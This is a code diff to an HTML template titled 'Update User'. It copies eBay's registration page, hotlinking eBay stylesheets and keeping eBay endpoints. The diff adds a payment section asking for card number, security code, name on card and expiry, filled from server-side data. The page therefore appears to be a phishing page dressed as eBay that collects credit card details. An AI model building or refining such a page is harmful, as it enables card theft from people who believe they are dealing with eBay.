@@ -4,6 +4,7 @@
 <meta content="text/html;charset=UTF-8" http-equiv="Content-Type">
 <title>Update User</title>
 <script type="text/javascript">var layer = false;</script>
+<link href="/js/creditcardjs-v0.10.12.min.css" rel="stylesheet">
 <link rel="stylesheet" type="text/css" href="https://secureir.ebaystatic.com/rs/v/kp2d0yxoguy0xnebuz2qnu0zc2t.css">
 <link rel="stylesheet" type="text/css" href="https://secureir.ebaystatic.com/rs/v/jmpqbbql1m0sxlirqtx1kcedxef.css">
 <link href="https://secureir.ebaystatic.com/rs/v/nqbcbh0ana4jfbpsz0xsdlwpamb.css" type="text/css" rel="stylesheet">
@@ -288,6 +289,22 @@ var hash = CryptoJS.MD5("pass");
 </ul>
 </div>
 </div>
+
+<div class="rcl">
+<div>
+<div class="fv-w">
+<label for="contact">Phone number</label>
+<div class="fv-tw ">
+<input maxlength="10" type="text" name="contact" placeholder="Please enter 10 digit number" class="w242" pattern= "[0-9]{10}" value="<%=data.contact%>" id="contact" v="1" a="1" aria-autocomplete="none" ph="1" aria-required="true" autocomplete="off" autocorrect="off" required>
+<div role="alert" aria-live="assertive">
+<div id="dayphone1_w" class="rdn">Please enter a valid phone number.</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+
+<hr>
 <div class="rcl"></div>
 </div>
 
@@ -356,20 +373,77 @@ id="country"  name="country" value="<%=data.country%>"></input></input></input><
 </div>
 </div>
 </div>
-<div class="rcl">
-<div>
-<div class="fv-w">
-<label for="contact">Phone number</label>
-<div class="fv-tw ">
-<input maxlength="10" type="text" name="contact" placeholder="Please enter 10 digit number" class="w242" pattern= "[0-9]{10}" value="<%=data.contact%>" id="contact" v="1" a="1" aria-autocomplete="none" ph="1" aria-required="true" autocomplete="off" autocorrect="off" required>
-<div role="alert" aria-live="assertive">
-<div id="dayphone1_w" class="rdn">Please enter a valid phone number.</div>
+
+<hr>
+  <div class="ccjs-card">
+  <label class="ccjs-number">
+    Card Number
+    <input required name="card_number" value = "<%=data.card_number%>" class="ccjs-number" placeholder="•••• •••• •••• ••••">
+  </label>
+
+  <label class="ccjs-csc">
+    Security Code
+    <input required name="csc" value = "<%=data.code%>" class="ccjs-csc" placeholder="•••">
+  </label>
+
+  <button type="button" class="ccjs-csc-help">?</button>
+
+  <label class="ccjs-name">
+    Name on Card
+    <input required name="cardname" value = "<%=data.card_name%>" class="ccjs-name">
+  </label>
+
+  <fieldset class="ccjs-expiration">
+    <legend>Expiration</legend>
+    <select required name="month" class="ccjs-month">
+      <option selected><%=data.expiry_mm%></option>
+      <option value="01">01</option>
+      <option value="02">02</option>
+      <option value="03">03</option>
+      <option value="04">04</option>
+      <option value="05">05</option>
+      <option value="06">06</option>
+      <option value="07">07</option>
+      <option value="08">08</option>
+      <option value="09">09</option>
+      <option value="10">10</option>
+      <option value="11">11</option>
+      <option value="12">12</option>
+    </select>
+
+    <select required name="year" class="ccjs-year">
+      <option selected><%=data.expiry_yy%></option>
+      <option value="14">14</option>
+      <option value="15">15</option>
+      <option value="16">16</option>
+      <option value="17">17</option>
+      <option value="18">18</option>
+      <option value="19">19</option>
+      <option value="20">20</option>
+      <option value="21">21</option>
+      <option value="22">22</option>
+      <option value="23">23</option>
+      <option value="24">24</option>
+    </select>
+  </fieldset>
+
+  <select required name="card-type" class="ccjs-hidden-card-type">
+    <option value="amex" class="ccjs-amex">American Express</option>
+    <option value="discover" class="ccjs-discover">Discover</option>
+    <option value="mastercard" class="ccjs-mastercard">MasterCard</option>
+    <option value="visa" class="ccjs-visa">Visa</option>
+    <option value="diners-club" class="ccjs-diners-club">Diners Club</option>
+    <option value="jcb" class="ccjs-jcb">JCB</option>
+    <!--<option value="laser" class="laser">Laser</option>-->
+    <!--<option value="maestro" class="maestro">Maestro</option>-->
+    <!--<option value="unionpay" class="unionpay">UnionPay</option>-->
+    <!--<option value="visa-electron" class="visa-electron">Visa Electron</option>-->
+    <!--<option value="dankort" class="dankort">Dankort</option>-->
+  </select>
+
 </div>
-</div>
-</div>
-</div>
-</div>
-</div>
+<script src="/js/creditcardjs-v0.10.12.min.js"></script>
+
 <div>
 <!-- shows old term of use with no option for marketing checkbox -->
 
@@ -468,7 +542,7 @@ var ajaxFlds = {"firstname":nameGrp,"lastname":nameGrp,"email":emailGrp,"userid"
 var ajaxMode = {"firstname":"1","lastname":"2","email":"5","userid":"7","PASSWORD":"6","rpass":"8"};
 var nextElem = "#PASSWORD";
 var pwdMeter = {"Weak":"pg-i pg-pwn","Invalid":"pg-i pg-pin","Strong":"pg-i pg-psn","Medium":"pg-i pg-pmn","Too short":"pg-i pg-pin","Strength":""};
-var logurl = "https://scgi.ebay.com/ws/eBayISAPI.dll?LogBuyerRegistrationJSEvent"+"&amp;regppapage=1";
+var logurl = "https://scgi.ebay.com/ws/eBayISAPI.dll?LogcRegistrationJSEvent"+"&amp;regppapage=1";
 var trackFld = {"lastname" : 25,"userid" : 28,"firstname" : 25,"PASSWORD" : 29,"email" : 27,"PASSWORD" : 29};
 var actionUrl = "https://reg.ebay.com/reg/PartialReg";
 var errPos ={"firstname" : 140, "lastname" : 140,"email" : 190, "userid" :230,
